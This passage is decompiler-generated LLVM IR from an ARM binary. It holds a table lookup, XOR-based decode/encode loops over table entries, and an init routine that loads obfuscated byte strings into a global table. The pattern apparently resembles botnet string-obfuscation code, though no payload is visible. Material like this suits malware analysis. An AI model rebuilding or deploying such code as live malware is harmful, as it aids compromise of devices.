  uselistorder i32* @sb, { 2, 3, 6, 0, 1, 4, 5, 49, 48, 7, 8, 50, 51, 39, 40, 41, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 43, 44, 45, 46, 47, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64 }
  uselistorder i32* @r8, { 7, 8, 10, 9, 11, 12, 13, 87, 88, 89, 90, 76, 77, 78, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 1, 2, 3, 4, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 6, 47, 48, 49, 50, 51, 52, 53, 54, 5, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 79, 80, 81, 82, 83, 84, 85, 86, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 130, 127, 128, 129, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 155, 156, 154, 157, 158, 159, 160, 161, 162, 163 }
  uselistorder i32* @r7, { 138, 139, 5, 13, 6, 1, 4, 20, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 21, 22, 140, 141, 142, 123, 124, 125, 23, 0, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 3, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185 }
  uselistorder i32* @r6, { 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 191, 192, 24, 23, 25, 26, 27, 28, 29, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 173, 174, 175, 0, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 2, 46, 47, 48, 49, 50, 11, 51, 52, 53, 54, 55, 56, 57, 1, 58, 59, 60, 3, 61, 62, 63, 4, 64, 5, 65, 6, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 205, 208, 206, 207, 209, 210, 12, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 7, 226, 227, 228, 229, 230, 231, 233, 8, 232, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 9, 10, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279 }
  uselistorder i32* @r5, { 17, 18, 343, 344, 345, 346, 347, 348, 19, 349, 46, 350, 351, 352, 2, 1, 353, 354, 20, 21, 22, 23, 24, 47, 14, 15, 16, 50, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 51, 52, 53, 54, 48, 49, 355, 356, 357, 358, 359, 55, 360, 361, 9, 362, 363, 364, 365, 366, 367, 368, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 3, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 0, 102, 103, 104, 105, 106, 107, 11, 108, 109, 110, 111, 112, 113, 114, 115, 12, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 369, 370, 371, 372, 373, 374, 375, 376, 378, 379, 377, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 7, 417, 418, 419, 420, 421, 422, 423, 10, 424, 425, 4, 426, 427, 5, 428, 429, 6, 430, 431, 432, 433, 434, 435, 13, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 8, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478 }
  uselistorder label %dec_label_pc_12f88, { 1, 0 }
  uselistorder label %dec_label_pc_12e18, { 1, 0 }
  uselistorder label %dec_label_pc_12d84, { 2, 0, 1 }
  uselistorder label %bb353, { 1, 0 }
  uselistorder label %dec_label_pc_12d44, { 1, 0 }
  uselistorder label %dec_label_pc_12c10, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12bfc, { 1, 0 }
  uselistorder label %dec_label_pc_12ba4, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_12b88, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12a04, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_129f0, { 1, 0 }
  uselistorder label %dec_label_pc_12950, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1293c, { 1, 0 }
  uselistorder label %dec_label_pc_1289c, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_12888, { 1, 0 }
  uselistorder label %dec_label_pc_127e8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_127d4, { 1, 0 }
  uselistorder label %dec_label_pc_1275c, { 1, 0 }
  uselistorder label %dec_label_pc_12750, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1273c, { 1, 0 }
  uselistorder label %dec_label_pc_125c0, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_125ac, { 1, 0 }
  uselistorder label %dec_label_pc_12568, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_12558, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb327, { 2, 1, 0 }
  uselistorder label %bb324, { 2, 1, 0 }
  uselistorder label %dec_label_pc_124b8, { 1, 0 }
  uselistorder label %dec_label_pc_124b8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12440, { 1, 0 }
  uselistorder label %bb321, { 1, 0 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
  uselistorder label %dec_label_pc_123e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123d8thread-pre-split, { 4, 5, 3, 7, 2, 6, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_123d8thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_123e0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_123d4.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12394, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12270, { 6, 7, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_1224c, { 1, 0 }
  uselistorder label %bb313, { 1, 0 }
  uselistorder label %bb311, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_120b4.dec_label_pc_120b4_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12098.dec_label_pc_12098_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12090, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12088, { 1, 0 }
  uselistorder label %dec_label_pc_1203c, { 1, 0 }
  uselistorder label %dec_label_pc_11edc, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_11ed0, { 1, 0 }
  uselistorder label %.thread49, { 2, 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_11d34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11d10, { 1, 0 }
  uselistorder label %dec_label_pc_11d04, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11ce0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11cbc, { 1, 0 }
  uselistorder label %bb281, { 1, 0 }
  uselistorder label %dec_label_pc_11c68, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_1174c, { 1, 0 }
}

define i32 @function_12f90(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_12f90:
  %v3_12f94 = mul i32 %arg1, 8
  %v2_12f98 = add i32 %v3_12f94, ptrtoint (i32* @global_var_1cd74.390 to i32)
  %v2_12f9c = icmp eq i32* %arg2, null
  br i1 %v2_12f9c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12f90
  %v3_12fa811 = inttoptr i32 %v2_12f98 to i32*
  %v4_12fa812 = load i32, i32* %v3_12fa811, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_12f90
  %v2_12fa0 = add i32 %v3_12f94, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 5)
  %v3_12fa0 = inttoptr i32 %v2_12fa0 to i8*
  %v4_12fa0 = load i8, i8* %v3_12fa0, align 1
  %v5_12fa0 = zext i8 %v4_12fa0 to i32
  %v2_12fa4 = add i32 %v3_12f94, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 4)
  %v3_12fa4 = inttoptr i32 %v2_12fa4 to i8*
  %v4_12fa4 = load i8, i8* %v3_12fa4, align 4
  %v5_12fa4 = zext i8 %v4_12fa4 to i32
  %v3_12fa8 = inttoptr i32 %v2_12f98 to i32*
  %v4_12fa8 = load i32, i32* %v3_12fa8, align 4
  %v5_12fac = mul nuw nsw i32 %v5_12fa0, 256
  %v6_12fac = or i32 %v5_12fa4, %v5_12fac
  store i32 %v6_12fac, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_12fa8714 = phi i32 [ %v4_12fa812, %.thread ], [ %v4_12fa8, %bb ]
  ret i32 %v4_12fa8714

; uselistorder directives
  uselistorder i32 %v2_12f98, { 1, 0 }
  uselistorder i32 %v3_12f94, { 2, 1, 0 }
  uselistorder i32* null, { 3, 8, 4, 5, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 2, 22, 0, 23, 7, 24, 25, 26, 33, 27, 28, 29, 30, 31, 32, 6, 34 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_12fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12fbc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12fbc = mul i32 %arg1, 8
  %v3_12fc0 = load i32, i32* @r4, align 4
  store i32 %v3_12fc0, i32* %stack_var_-20, align 4
  %v3_12fd0 = and i32 %v3_12fbc, 2040
  %v2_12fd4 = add i32 %v3_12fd0, ptrtoint (i32* @global_var_1cd74.390 to i32)
  store i32 %v2_12fd4, i32* %lr.global-to-local, align 4
  %v1_12fdc = add i32 %v3_12fd0, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 4)
  store i32 %v1_12fdc, i32* %r7.global-to-local, align 4
  %v2_12fe0 = load i32, i32* @global_var_1ccb0.393, align 4
  %v2_12fe4 = inttoptr i32 %v1_12fdc to i8*
  %v3_12fe4 = load i8, i8* %v2_12fe4, align 4
  %v4_12fe4 = zext i8 %v3_12fe4 to i32
  store i32 %v4_12fe4, i32* @r1, align 4
  %v1_12fe8 = add i32 %v3_12fd0, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 5)
  %v2_12fe8 = inttoptr i32 %v1_12fe8 to i8*
  %v3_12fe8 = load i8, i8* %v2_12fe8, align 1
  %v4_12fe8 = zext i8 %v3_12fe8 to i32
  %v3_12fec = udiv i32 %v2_12fe0, 256
  %v4_12ff0 = mul nuw nsw i32 %v4_12fe8, 256
  %v5_12ff0 = or i32 %v4_12ff0, %v4_12fe4
  %v7_12ff0 = icmp eq i32 %v5_12ff0, 0
  store i1 %v7_12ff0, i1* @cpsr_z, align 1
  %v3_12ff4 = udiv i32 %v2_12fe0, 65536
  %v1_12ff8 = urem i32 %v3_12fec, 256
  store i32 %v1_12ff8, i32* %r6.global-to-local, align 4
  %v1_12ffc = urem i32 %v3_12ff4, 256
  store i32 %v1_12ffc, i32* %r5.global-to-local, align 4
  %v3_13000 = udiv i32 %v2_12fe0, 16777216
  store i32 %v3_13000, i32* %r4.global-to-local, align 4
  %v1_13004 = urem i32 %v2_12fe0, 256
  br i1 %v7_12ff0, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_12fbc
  store i32 %v3_12fc0, i32* @r4, align 4
  ret i32 %v1_13004

bb8:                                              ; preds = %dec_label_pc_12fbc
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %dec_label_pc_13010, %bb8
  %v2_1301c = phi i32 [ %v1_13058, %dec_label_pc_13010 ], [ 0, %bb8 ]
  %v0_13010 = phi i32 [ %v0_13050, %dec_label_pc_13010 ], [ %v2_12fd4, %bb8 ]
  %v1_13010 = inttoptr i32 %v0_13010 to i32*
  %v2_13010 = load i32, i32* %v1_13010, align 4
  %v2_13014 = add i32 %v2_13010, %v2_1301c
  %v3_13014 = inttoptr i32 %v2_13014 to i8*
  %v4_13014 = load i8, i8* %v3_13014, align 1
  %v6_13014 = zext i8 %v4_13014 to i32
  %v2_13018 = xor i32 %v6_13014, %v1_13004
  %v1_1301c = trunc i32 %v2_13018 to i8
  store i8 %v1_1301c, i8* %v3_13014, align 1
  %v0_13020 = load i32, i32* %lr.global-to-local, align 4
  %v1_13020 = inttoptr i32 %v0_13020 to i32*
  %v2_13020 = load i32, i32* %v1_13020, align 4
  %v0_13024 = load i32, i32* %ip.global-to-local, align 4
  %v2_13024 = add i32 %v0_13024, %v2_13020
  %v3_13024 = inttoptr i32 %v2_13024 to i8*
  %v4_13024 = load i8, i8* %v3_13024, align 1
  %v6_13024 = zext i8 %v4_13024 to i32
  %v0_13028 = load i32, i32* %r6.global-to-local, align 4
  %v2_13028 = xor i32 %v0_13028, %v6_13024
  %v1_1302c = trunc i32 %v2_13028 to i8
  store i8 %v1_1302c, i8* %v3_13024, align 1
  %v0_13030 = load i32, i32* %lr.global-to-local, align 4
  %v1_13030 = inttoptr i32 %v0_13030 to i32*
  %v2_13030 = load i32, i32* %v1_13030, align 4
  %v0_13034 = load i32, i32* %ip.global-to-local, align 4
  %v2_13034 = add i32 %v0_13034, %v2_13030
  %v3_13034 = inttoptr i32 %v2_13034 to i8*
  %v4_13034 = load i8, i8* %v3_13034, align 1
  %v6_13034 = zext i8 %v4_13034 to i32
  %v0_13038 = load i32, i32* %r5.global-to-local, align 4
  %v2_13038 = xor i32 %v0_13038, %v6_13034
  %v1_1303c = trunc i32 %v2_13038 to i8
  store i8 %v1_1303c, i8* %v3_13034, align 1
  %v0_13040 = load i32, i32* %lr.global-to-local, align 4
  %v1_13040 = inttoptr i32 %v0_13040 to i32*
  %v2_13040 = load i32, i32* %v1_13040, align 4
  store i32 %v2_13040, i32* @r1, align 4
  %v0_13044 = load i32, i32* %ip.global-to-local, align 4
  %v2_13044 = add i32 %v0_13044, %v2_13040
  %v3_13044 = inttoptr i32 %v2_13044 to i8*
  %v4_13044 = load i8, i8* %v3_13044, align 1
  %v6_13044 = zext i8 %v4_13044 to i32
  %v0_13048 = load i32, i32* %r4.global-to-local, align 4
  %v2_13048 = xor i32 %v0_13048, %v6_13044
  %v1_1304c = trunc i32 %v2_13048 to i8
  store i8 %v1_1304c, i8* %v3_13044, align 1
  %v0_13050 = load i32, i32* %lr.global-to-local, align 4
  %v1_13050 = add i32 %v0_13050, 4
  %v2_13050 = inttoptr i32 %v1_13050 to i8*
  %v3_13050 = load i8, i8* %v2_13050, align 1
  %v4_13050 = zext i8 %v3_13050 to i32
  %v0_13054 = load i32, i32* %r7.global-to-local, align 4
  %v1_13054 = add i32 %v0_13054, 1
  %v2_13054 = inttoptr i32 %v1_13054 to i8*
  %v3_13054 = load i8, i8* %v2_13054, align 1
  %v4_13054 = zext i8 %v3_13054 to i32
  %v0_13058 = load i32, i32* %ip.global-to-local, align 4
  %v1_13058 = add i32 %v0_13058, 1
  store i32 %v1_13058, i32* %ip.global-to-local, align 4
  %v4_1305c = mul nuw nsw i32 %v4_13054, 256
  %v5_1305c = or i32 %v4_1305c, %v4_13050
  %v9_13060 = icmp eq i32 %v5_1305c, %v1_13058
  store i1 %v9_13060, i1* @cpsr_z, align 1
  %v8_13064 = icmp sgt i32 %v5_1305c, %v1_13058
  br i1 %v8_13064, label %dec_label_pc_13010, label %dec_label_pc_13068

dec_label_pc_13068:                               ; preds = %dec_label_pc_13010
  %v2_13068 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13068, i32* @r4, align 4
  ret i32 %v1_13004

; uselistorder directives
  uselistorder i32 %v1_13058, { 1, 2, 3, 0 }
  uselistorder i32 %v0_13050, { 1, 0 }
  uselistorder i32 %v1_13004, { 1, 2, 0 }
  uselistorder i32 %v2_12fe0, { 3, 0, 1, 2 }
}

define i32 @function_13074(i32 %arg1) local_unnamed_addr {
dec_label_pc_13074:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13074 = mul i32 %arg1, 8
  %v3_13078 = load i32, i32* @r4, align 4
  store i32 %v3_13078, i32* %stack_var_-20, align 4
  %v3_13088 = and i32 %v3_13074, 2040
  %v2_1308c = add i32 %v3_13088, ptrtoint (i32* @global_var_1cd74.390 to i32)
  store i32 %v2_1308c, i32* %lr.global-to-local, align 4
  %v1_13094 = add i32 %v3_13088, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 4)
  store i32 %v1_13094, i32* %r7.global-to-local, align 4
  %v2_13098 = load i32, i32* @global_var_1ccb0.393, align 4
  %v2_1309c = inttoptr i32 %v1_13094 to i8*
  %v3_1309c = load i8, i8* %v2_1309c, align 4
  %v4_1309c = zext i8 %v3_1309c to i32
  %v1_130a0 = add i32 %v3_13088, add (i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32 5)
  %v2_130a0 = inttoptr i32 %v1_130a0 to i8*
  %v3_130a0 = load i8, i8* %v2_130a0, align 1
  %v4_130a0 = zext i8 %v3_130a0 to i32
  %v3_130a4 = udiv i32 %v2_13098, 256
  %v4_130a8 = mul nuw nsw i32 %v4_130a0, 256
  %v5_130a8 = or i32 %v4_130a8, %v4_1309c
  %v7_130a8 = icmp eq i32 %v5_130a8, 0
  %v3_130ac = udiv i32 %v2_13098, 65536
  %v1_130b0 = urem i32 %v3_130a4, 256
  store i32 %v1_130b0, i32* %r6.global-to-local, align 4
  %v1_130b4 = urem i32 %v3_130ac, 256
  store i32 %v1_130b4, i32* %r5.global-to-local, align 4
  %v3_130b8 = udiv i32 %v2_13098, 16777216
  store i32 %v3_130b8, i32* %r4.global-to-local, align 4
  %v1_130bc = urem i32 %v2_13098, 256
  br i1 %v7_130a8, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_13074
  store i32 %v3_13078, i32* @r4, align 4
  ret i32 %v1_130bc

bb8:                                              ; preds = %dec_label_pc_13074
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_130c8

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130c8, %bb8
  %v2_130d4 = phi i32 [ %v1_13110, %dec_label_pc_130c8 ], [ 0, %bb8 ]
  %v0_130c8 = phi i32 [ %v0_13108, %dec_label_pc_130c8 ], [ %v2_1308c, %bb8 ]
  %v1_130c8 = inttoptr i32 %v0_130c8 to i32*
  %v2_130c8 = load i32, i32* %v1_130c8, align 4
  %v2_130cc = add i32 %v2_130c8, %v2_130d4
  %v3_130cc = inttoptr i32 %v2_130cc to i8*
  %v4_130cc = load i8, i8* %v3_130cc, align 1
  %v6_130cc = zext i8 %v4_130cc to i32
  %v2_130d0 = xor i32 %v6_130cc, %v1_130bc
  %v1_130d4 = trunc i32 %v2_130d0 to i8
  store i8 %v1_130d4, i8* %v3_130cc, align 1
  %v0_130d8 = load i32, i32* %lr.global-to-local, align 4
  %v1_130d8 = inttoptr i32 %v0_130d8 to i32*
  %v2_130d8 = load i32, i32* %v1_130d8, align 4
  %v0_130dc = load i32, i32* %ip.global-to-local, align 4
  %v2_130dc = add i32 %v0_130dc, %v2_130d8
  %v3_130dc = inttoptr i32 %v2_130dc to i8*
  %v4_130dc = load i8, i8* %v3_130dc, align 1
  %v6_130dc = zext i8 %v4_130dc to i32
  %v0_130e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_130e0 = xor i32 %v0_130e0, %v6_130dc
  %v1_130e4 = trunc i32 %v2_130e0 to i8
  store i8 %v1_130e4, i8* %v3_130dc, align 1
  %v0_130e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_130e8 = inttoptr i32 %v0_130e8 to i32*
  %v2_130e8 = load i32, i32* %v1_130e8, align 4
  %v0_130ec = load i32, i32* %ip.global-to-local, align 4
  %v2_130ec = add i32 %v0_130ec, %v2_130e8
  %v3_130ec = inttoptr i32 %v2_130ec to i8*
  %v4_130ec = load i8, i8* %v3_130ec, align 1
  %v6_130ec = zext i8 %v4_130ec to i32
  %v0_130f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_130f0 = xor i32 %v0_130f0, %v6_130ec
  %v1_130f4 = trunc i32 %v2_130f0 to i8
  store i8 %v1_130f4, i8* %v3_130ec, align 1
  %v0_130f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_130f8 = inttoptr i32 %v0_130f8 to i32*
  %v2_130f8 = load i32, i32* %v1_130f8, align 4
  %v0_130fc = load i32, i32* %ip.global-to-local, align 4
  %v2_130fc = add i32 %v0_130fc, %v2_130f8
  %v3_130fc = inttoptr i32 %v2_130fc to i8*
  %v4_130fc = load i8, i8* %v3_130fc, align 1
  %v6_130fc = zext i8 %v4_130fc to i32
  %v0_13100 = load i32, i32* %r4.global-to-local, align 4
  %v2_13100 = xor i32 %v0_13100, %v6_130fc
  %v1_13104 = trunc i32 %v2_13100 to i8
  store i8 %v1_13104, i8* %v3_130fc, align 1
  %v0_13108 = load i32, i32* %lr.global-to-local, align 4
  %v1_13108 = add i32 %v0_13108, 4
  %v2_13108 = inttoptr i32 %v1_13108 to i8*
  %v3_13108 = load i8, i8* %v2_13108, align 1
  %v4_13108 = zext i8 %v3_13108 to i32
  %v0_1310c = load i32, i32* %r7.global-to-local, align 4
  %v1_1310c = add i32 %v0_1310c, 1
  %v2_1310c = inttoptr i32 %v1_1310c to i8*
  %v3_1310c = load i8, i8* %v2_1310c, align 1
  %v4_1310c = zext i8 %v3_1310c to i32
  %v0_13110 = load i32, i32* %ip.global-to-local, align 4
  %v1_13110 = add i32 %v0_13110, 1
  store i32 %v1_13110, i32* %ip.global-to-local, align 4
  %v4_13114 = mul nuw nsw i32 %v4_1310c, 256
  %v5_13114 = or i32 %v4_13114, %v4_13108
  %v8_1311c = icmp sgt i32 %v5_13114, %v1_13110
  br i1 %v8_1311c, label %dec_label_pc_130c8, label %dec_label_pc_13120

dec_label_pc_13120:                               ; preds = %dec_label_pc_130c8
  %v2_13120 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13120, i32* @r4, align 4
  ret i32 %v1_130bc

; uselistorder directives
  uselistorder i32 %v1_13110, { 1, 2, 0 }
  uselistorder i32 %v0_13108, { 1, 0 }
  uselistorder i32 %v1_130bc, { 1, 2, 0 }
  uselistorder i32 %v2_13098, { 3, 0, 1, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 9, 6, 8, 7, 10, 12, 11, 14, 13, 16, 15, 17, 18, 26, 19, 27, 20, 28, 21, 29, 30, 22, 31, 23, 32, 24, 33, 25, 37, 34, 38, 35, 39, 36, 43, 40, 44, 41, 45, 42, 46, 47, 48, 53, 49, 54, 50, 55, 51, 56, 52, 57, 58, 59, 60, 61, 62, 66, 63, 67, 64, 68, 65, 69, 70, 72, 71, 78, 73, 79, 74, 80, 75, 81, 76, 82, 77, 83, 86, 87, 84, 85, 88, 89, 93, 90, 94, 91, 92, 95, 102, 96, 103, 104, 97, 105, 100, 106, 98, 107, 108, 99, 101, 109, 110, 114, 111, 115, 116, 112, 113, 117, 118, 119, 121, 120, 124, 122, 125, 123, 126, 127, 128 }
}

define i32 @function_1312c() local_unnamed_addr {
dec_label_pc_1312c:
  %fp.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1312c = load i32, i32* @r4, align 4
  store i32 %v3_1312c, i32* %stack_var_-36, align 4
  %v1_13134 = call i32* @malloc(i32 9)
  %v2_13134 = ptrtoint i32* %v1_13134 to i32
  store i32 ptrtoint (i32* @global_var_1cd74.390 to i32), i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_13134, i32* %r5.global-to-local, align 4
  %v4_1314c = call i32 @function_13a18(i32 %v2_13134, i32 ptrtoint ([10 x i8]* @global_var_145ac.398 to i32), i32 9)
  store i32 9, i32* %r3.global-to-local, align 4
  store i8 9, i8* bitcast (i32* @global_var_1cd90.399 to i8*), align 4
  %v0_1315c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1315c, i32* @global_var_1cd8c.400, align 4
  %v0_13160 = load i32, i32* %r6.global-to-local, align 4
  %v1_13160 = trunc i32 %v0_13160 to i8
  store i8 %v1_13160, i8* bitcast (i32* @global_var_1cd91.401 to i8*), align 4
  %v1_13164 = call i32* @malloc(i32 2)
  %v2_13164 = ptrtoint i32* %v1_13164 to i32
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 %v2_13164, i32* %r7.global-to-local, align 4
  %v4_13178 = call i32 @function_13a18(i32 %v2_13164, i32 ptrtoint ([3 x i8]* @global_var_145b8.403 to i32), i32 2)
  %v0_13180 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_13180, i32* @global_var_1cd94.404, align 4
  %v0_13184 = load i32, i32* %r5.global-to-local, align 4
  %v1_13184 = trunc i32 %v0_13184 to i8
  store i8 %v1_13184, i8* bitcast (i32* @global_var_1cd98.405 to i8*), align 4
